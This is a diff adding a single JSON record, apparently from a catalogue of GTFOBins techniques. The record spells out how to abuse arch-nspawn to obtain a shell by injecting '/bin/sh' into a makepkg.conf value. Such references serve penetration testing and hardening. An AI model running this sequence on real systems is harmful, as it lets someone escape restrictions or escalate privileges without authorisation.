@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-arch-nspawn-shell",
+  "name": "GTFOBins · arch-nspawn (shell)",
+  "command": "mkdir -p ./etc/\ngrep -oP \"^CHROOT_VERSION='\\K[^']+\" /usr/share/devtools/lib/archroot.sh >.arch-chroot\ntouch ./etc/pacman.conf\necho 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf\narch-nspawn .",
+  "description": "Use arch-nspawn to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "arch-nspawn",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/arch-nspawn/#shell",
+  "upstream_id": "arch-nspawn/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/arch-nspawn/"
+    }
+  ]
+}
